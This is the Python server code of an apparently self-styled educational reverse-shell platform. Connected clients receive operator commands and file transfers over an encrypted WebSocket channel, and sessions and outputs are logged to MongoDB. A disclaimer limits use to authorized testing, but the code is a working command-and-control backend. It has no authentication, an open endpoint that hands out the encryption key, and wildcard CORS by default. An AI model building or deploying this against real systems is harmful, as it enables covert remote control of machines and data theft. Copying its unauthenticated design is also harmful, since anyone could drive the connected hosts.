from fastapi import FastAPI, APIRouter, WebSocket, WebSocketDisconnect, HTTPException, UploadFile, File
from fastapi.responses import FileResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import json
import base64
import asyncio
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Dict, Optional
import uuid
from datetime import datetime
from cryptography.fernet import Fernet
import socket
import threading
import subprocess

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI(title="CyberSec Educational Platform", description="Educational Reverse Shell Platform for Cybersecurity Learning")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Global variables for reverse shell management
connected_clients = {}
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

# Models
class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

class ReverseShellSession(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_ip: str
    client_hostname: str
    connection_time: datetime = Field(default_factory=datetime.utcnow)
    status: str = "active"
    last_command: Optional[str] = None
    last_activity: datetime = Field(default_factory=datetime.utcnow)

class CommandExecution(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str
    command: str
    output: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    execution_time: Optional[float] = None

class FileTransfer(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    session_id: str
    filename: str
    file_size: int
    transfer_type: str  # "upload" or "download"
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    status: str = "completed"

class CommandRequest(BaseModel):
    session_id: str
    command: str

class FileTransferRequest(BaseModel):
    session_id: str
    filename: str
    file_data: str  # base64 encoded
    transfer_type: str

# WebSocket Connection Manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.client_sessions: Dict[str, ReverseShellSession] = {}

    async def connect(self, websocket: WebSocket, session_id: str):
        await websocket.accept()
        self.active_connections[session_id] = websocket

    def disconnect(self, session_id: str):
        if session_id in self.active_connections:
            del self.active_connections[session_id]
        if session_id in self.client_sessions:
            self.client_sessions[session_id].status = "disconnected"

    async def send_personal_message(self, message: str, session_id: str):
        if session_id in self.active_connections:
            await self.active_connections[session_id].send_text(message)

    async def broadcast(self, message: str):
        for connection in self.active_connections.values():
            await connection.send_text(message)

manager = ConnectionManager()

# Educational Disclaimer and Warning
EDUCATIONAL_DISCLAIMER = """
🚨 EDUCATIONAL CYBERSECURITY PLATFORM 🚨

⚠️  WARNING: This is an educational tool for authorized penetration testing and cybersecurity learning only.

✅ AUTHORIZED USES:
   - Educational coursework and research
   - Authorized penetration testing on systems you own
   - Cybersecurity training in controlled environments
   - Academic projects and internships

❌ PROHIBITED USES:
   - Unauthorized access to systems
   - Malicious activities
   - Illegal hacking or intrusion
   - Any activity without explicit permission

📚 EDUCATIONAL PURPOSE:
This platform helps students understand:
   - Reverse shell concepts and mechanisms
   - Socket programming and network communication
   - Cybersecurity defense techniques
   - Ethical hacking methodologies

🛡️ LEGAL RESPONSIBILITY:
   - Use only on systems you own or have explicit permission to test
   - Comply with all applicable laws and regulations
   - Understand the legal implications of cybersecurity tools
   - Report vulnerabilities responsibly

By using this platform, you acknowledge that you understand these guidelines
and will use this tool responsibly for educational purposes only.
"""

# Routes
@api_router.get("/")
async def root():
    return {
        "message": "CyberSec Educational Platform",
        "disclaimer": "Educational tool for authorized cybersecurity learning only",
        "version": "1.0.0"
    }

@api_router.get("/disclaimer")
async def get_disclaimer():
    return {"disclaimer": EDUCATIONAL_DISCLAIMER}

@api_router.get("/encryption-key")
async def get_encryption_key():
    """Get the encryption key for client connections (for educational purposes)"""
    return {"encryption_key": encryption_key.decode()}

@api_router.get("/sessions", response_model=List[ReverseShellSession])
async def get_active_sessions():
    """Get all active reverse shell sessions"""
    sessions = await db.reverse_shell_sessions.find({"status": "active"}).to_list(1000)
    return [ReverseShellSession(**session) for session in sessions]

@api_router.get("/sessions/{session_id}/commands", response_model=List[CommandExecution])
async def get_session_commands(session_id: str):
    """Get command history for a specific session"""
    commands = await db.command_executions.find({"session_id": session_id}).sort("timestamp", -1).to_list(100)
    return [CommandExecution(**cmd) for cmd in commands]

@api_router.post("/sessions/{session_id}/execute")
async def execute_command(session_id: str, command_request: CommandRequest):
    """Execute a command on a connected client"""
    if session_id not in manager.active_connections:
        raise HTTPException(status_code=404, detail="Session not found or not connected")
    
    try:
        # Send command to client via WebSocket
        command_data = {
            "type": "command",
            "command": command_request.command,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        encrypted_command = cipher_suite.encrypt(json.dumps(command_data).encode())
        await manager.send_personal_message(base64.b64encode(encrypted_command).decode(), session_id)
        
        # Log command execution attempt
        command_execution = CommandExecution(
            session_id=session_id,
            command=command_request.command,
            output="Command sent to client, awaiting response...",
            execution_time=0.0
        )
        
        await db.command_executions.insert_one(command_execution.dict())
        
        return {"message": "Command sent successfully", "command_id": command_execution.id}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to execute command: {str(e)}")

@api_router.post("/sessions/{session_id}/file-transfer")
async def initiate_file_transfer(session_id: str, transfer_request: FileTransferRequest):
    """Initiate file transfer with a connected client"""
    if session_id not in manager.active_connections:
        raise HTTPException(status_code=404, detail="Session not found or not connected")
    
    try:
        # Send file transfer request to client
        transfer_data = {
            "type": "file_transfer",
            "filename": transfer_request.filename,
            "file_data": transfer_request.file_data,
            "transfer_type": transfer_request.transfer_type,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        encrypted_data = cipher_suite.encrypt(json.dumps(transfer_data).encode())
        await manager.send_personal_message(base64.b64encode(encrypted_data).decode(), session_id)
        
        # Log file transfer
        file_transfer = FileTransfer(
            session_id=session_id,
            filename=transfer_request.filename,
            file_size=len(transfer_request.file_data),
            transfer_type=transfer_request.transfer_type
        )
        
        await db.file_transfers.insert_one(file_transfer.dict())
        
        return {"message": "File transfer initiated", "transfer_id": file_transfer.id}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to initiate file transfer: {str(e)}")

@api_router.get("/analytics/sessions-summary")
async def get_sessions_summary():
    """Get summary analytics of sessions"""
    total_sessions = await db.reverse_shell_sessions.count_documents({})
    active_sessions = await db.reverse_shell_sessions.count_documents({"status": "active"})
    total_commands = await db.command_executions.count_documents({})
    total_file_transfers = await db.file_transfers.count_documents({})
    
    return {
        "total_sessions": total_sessions,
        "active_sessions": active_sessions,
        "connected_clients": len(manager.active_connections),
        "total_commands": total_commands,
        "total_file_transfers": total_file_transfers
    }

# WebSocket endpoint for reverse shell clients
@app.websocket("/ws/client/{client_id}")
async def websocket_client_endpoint(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for reverse shell clients to connect"""
    session_id = str(uuid.uuid4())
    
    try:
        await manager.connect(websocket, session_id)
        
        # Get client information
        client_host = websocket.client.host
        
        # Create session record
        session = ReverseShellSession(
            id=session_id,
            client_ip=client_host,
            client_hostname=client_id,
            status="active"
        )
        
        manager.client_sessions[session_id] = session
        await db.reverse_shell_sessions.insert_one(session.dict())
        
        logging.info(f"New reverse shell client connected: {client_id} from {client_host}")
        
        # Send welcome message with encryption key
        welcome_data = {
            "type": "welcome",
            "session_id": session_id,
            "encryption_key": encryption_key.decode(),
            "message": "Connected to CyberSec Educational Platform"
        }
        
        await manager.send_personal_message(json.dumps(welcome_data), session_id)
        
        # Listen for client responses
        while True:
            data = await websocket.receive_text()
            
            try:
                # Decrypt incoming data
                encrypted_data = base64.b64decode(data.encode())
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                response = json.loads(decrypted_data.decode())
                
                # Handle different types of responses
                if response.get("type") == "command_response":
                    # Update command execution record
                    await db.command_executions.update_one(
                        {"session_id": session_id, "command": response.get("original_command")},
                        {"$set": {
                            "output": response.get("output", ""),
                            "execution_time": response.get("execution_time", 0.0)
                        }}
                    )
                    
                elif response.get("type") == "file_response":
                    # Handle file transfer response
                    logging.info(f"File transfer response from {client_id}: {response.get('filename')}")
                    
                elif response.get("type") == "heartbeat":
                    # Update last activity
                    await db.reverse_shell_sessions.update_one(
                        {"id": session_id},
                        {"$set": {"last_activity": datetime.utcnow()}}
                    )
                    
            except Exception as e:
                logging.error(f"Error processing client data: {str(e)}")
                
    except WebSocketDisconnect:
        manager.disconnect(session_id)
        await db.reverse_shell_sessions.update_one(
            {"id": session_id},
            {"$set": {"status": "disconnected"}}
        )
        logging.info(f"Reverse shell client disconnected: {client_id}")

# WebSocket endpoint for web dashboard
@app.websocket("/ws/dashboard")
async def websocket_dashboard_endpoint(websocket: WebSocket):
    """WebSocket endpoint for the web dashboard to receive real-time updates"""
    await websocket.accept()
    
    try:
        while True:
            # Send periodic updates about connected clients
            update_data = {
                "type": "dashboard_update",
                "connected_clients": len(manager.active_connections),
                "sessions": [session.dict() for session in manager.client_sessions.values()],
                "timestamp": datetime.utcnow().isoformat()
            }
            
            await websocket.send_text(json.dumps(update_data))
            await asyncio.sleep(5)  # Send updates every 5 seconds
            
    except WebSocketDisconnect:
        logging.info("Dashboard client disconnected")

# Legacy routes for basic functionality
@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("startup")
async def startup_event():
    logger.info("🚨 CyberSec Educational Platform Started")
    logger.info("⚠️  Educational tool for authorized cybersecurity learning only")
    logger.info(f"🔑 Encryption key generated: {encryption_key.decode()[:20]}...")

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()